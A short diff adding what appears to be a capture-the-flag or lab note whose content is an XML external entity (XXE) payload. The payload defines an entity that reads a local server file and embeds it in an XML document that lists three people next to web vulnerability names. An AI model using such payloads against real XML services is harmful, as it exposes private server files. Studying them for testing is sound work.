@@ -1,0 +1,19 @@
+# 1
+
+    <?xml version="1.0"?>
+    <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///app/readme.txt"> ]>
+
+    <document>
+    <root>&xxe;</root>
+    <person>Bruno Pala</person>
+    <web_vuln>ccc</web_vuln>
+    
+    <person>Federico Loi</person>
+    <web_vuln>SQLI</web_vuln>
+    
+    <person>Lorenzo Pisu</person>
+    <web_vuln>SSTI</web_vuln>
+    </document>
+  
+
+# 2
